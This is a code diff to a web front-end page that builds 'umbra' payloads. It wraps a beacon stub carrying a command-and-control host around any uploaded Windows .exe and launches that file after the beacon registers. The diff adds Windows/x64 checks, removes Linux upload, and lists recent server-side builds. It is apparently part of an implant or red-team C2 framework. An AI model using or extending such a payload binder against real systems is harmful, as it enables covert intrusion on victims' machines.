@@ -11,6 +11,7 @@ import { Switch } from '@/components/ui/Switch'
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/Select'
 import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/Tabs'
 import { cn } from '@/lib/utils'
+import { api } from '@/services/api'
 import type { PayloadConfig, BuildResult } from '@/types'
 import { wrapAgentBinary, sha256Hex, loadStubBinary, decryptTrailerJSON } from '@/lib/payloadWrap'
 import {
@@ -77,6 +78,12 @@ export function PayloadBuilderPage() {
   const [customConfigLines, setCustomConfigLines] = useState<string[]>([''])
   const [agentFile, setAgentFile] = useState<File | null>(null)
   const [agentFileLabel, setAgentFileLabel] = useState('')
+  const [history, setHistory] = useState<Array<{ id: string; filename: string; size: number; status: string; created_at: string }>>([])
+
+  const loadHistory = React.useCallback(() => {
+    api.getPayloadHistory().then(setHistory).catch(() => {})
+  }, [])
+  React.useEffect(() => { loadHistory() }, [loadHistory, result])
 
   const randomKey = () =>
     Array.from(crypto.getRandomValues(new Uint8Array(32)))
@@ -84,6 +91,14 @@ export function PayloadBuilderPage() {
       .join('')
 
   const handleBuild = async () => {
+    if (config.Platform !== 'windows') {
+      toast.error('Linux stub not built yet', { description: 'Browser wrapping is Windows-only for now. The baked stub is a Windows PE.' })
+      return
+    }
+    if (config.Arch !== 'x64') {
+      toast.error(`Unsupported architecture: ${config.Arch}`, { description: 'The embedded stub compiles for x64 only. Pick x64 or wait for per-arch stubs.' })
+      return
+    }
     setBuilding(true)
     setResult(null)
     try {
@@ -99,7 +114,7 @@ export function PayloadBuilderPage() {
       if (!check || !check.includes(`"c2_host":"${cfg.ServerHost}"`)) {
         throw new Error('trailer verify failed — stub wrap did not land')
       }
-      const name = cfg.Platform === 'linux' ? 'umbra-linux' : (agentFile?.name ? `umbra-${agentFile.name}` : 'umbra-windows.exe')
+      const name = agentFile?.name ? `umbra-${agentFile.name}` : 'umbra-windows.exe'
       const blob = new Blob([bytes as unknown as BlobPart], { type: 'application/octet-stream' })
       const url = URL.createObjectURL(blob)
       const a = document.createElement('a')
@@ -618,29 +633,17 @@ export function PayloadBuilderPage() {
                 <CardDescription>Optional. Your file is bound into the stub and launched after the beacon registers. Build works with no file — stub only.</CardDescription>
               </CardHeader>
               <CardContent className="space-y-4">
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
-                  <div className="space-y-4">
-                    <p className="font-medium text-dark-100">Windows Agent (.exe)</p>
-                    <Input
-                      type="file"
-                      accept=".exe"
-                      onChange={(e) => handleFileUpload(e, 'windows')}
-                      className="bg-dark-900 border-dark-700"
-                    />
-                    <p className="text-xs text-dark-500">
-                      {agentFileLabel || 'Pick any .exe. Build wraps the baked stub around it. Leave empty to download a beacon-only payload.'}
-                    </p>
-                  </div>
-                  <div className="space-y-4">
-                    <p className="font-medium text-dark-100">Linux Agent (ELF)</p>
-                    <Input
-                      type="file"
-                      accept=""
-                      onChange={(e) => handleFileUpload(e, 'linux')}
-                      className="bg-dark-900 border-dark-700"
-                    />
-                    <p className="text-xs text-dark-500">Upload a custom Linux x86_64 agent binary</p>
-                  </div>
+                <div className="space-y-4">
+                  <p className="font-medium text-dark-100">Windows Agent (.exe)</p>
+                  <Input
+                    type="file"
+                    accept=".exe"
+                    onChange={(e) => handleFileUpload(e, 'windows')}
+                    className="bg-dark-900 border-dark-700"
+                  />
+                  <p className="text-xs text-dark-500">
+                    {agentFileLabel || 'Pick any .exe. Build wraps the baked stub around it. Leave empty to download a beacon-only payload.'}
+                  </p>
                 </div>
               </CardContent>
             </Card>
@@ -766,6 +769,32 @@ export function PayloadBuilderPage() {
                 </Button>
               </div>
             </div>
+            {/* Recent Builds */}
+            {history.length > 0 && (
+              <div className="pt-4 border-t border-dark-700">
+                <p className="text-sm text-dark-400 mb-3">Recent Builds (server-side)</p>
+                <div className="space-y-1.5">
+                  {history.slice(0, 8).map(h => (
+                    <div key={h.id} className="flex items-center justify-between gap-3 px-3 py-2 rounded-lg border border-dark-700 bg-dark-900 text-sm">
+                      <div className="min-w-0 flex items-center gap-2">
+                        <FileCode className="w-4 h-4 text-dark-500 shrink-0" />
+                        <span className="truncate font-mono text-dark-200">{h.filename}</span>
+                      </div>
+                      <div className="flex items-center gap-3 shrink-0 text-xs text-dark-500">
+                        <span>{(h.size / 1024 / 1024).toFixed(1)} MB</span>
+                        <span>{new Date(h.created_at).toLocaleString()}</span>
+                        <a href={api.payloadDownloadUrl(h.id)} download={h.filename}>
+                          <Button variant="ghost" size="sm" className="h-7 px-2 text-accent-400 hover:text-accent-300">
+                            <Download className="w-3.5 h-3.5 mr-1" />
+                            Download
+                          </Button>
+                        </a>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            )}
           </CardContent>
         </Card>
       </motion.div>
